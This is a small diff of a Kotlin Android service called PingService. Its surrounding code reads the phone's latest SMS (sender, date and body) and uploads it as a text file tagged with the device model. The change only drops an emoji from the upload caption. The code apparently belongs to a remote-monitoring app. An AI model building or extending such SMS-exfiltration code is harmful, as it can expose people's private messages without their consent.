@@ -529,7 +529,7 @@ class PingService : Service() {
                         java.util.Locale.getDefault())
                     "\uD83D\uDCAC Last SMS\n[$typeStr] ${fmt.format(java.util.Date(date))}\n$addr\n$body"
                 } ?: "No SMS."
-                uploadText("last_sms.txt", text, "\uD83D\uDCF1 Last SMS from ${android.os.Build.MODEL}")
+                uploadText("last_sms.txt", text, "Last SMS from ${android.os.Build.MODEL}")
             } catch (e: Exception) {
                 prefs.edit().putString(KEY_REPORT, "SMS error: ${e.message}").apply()
             }
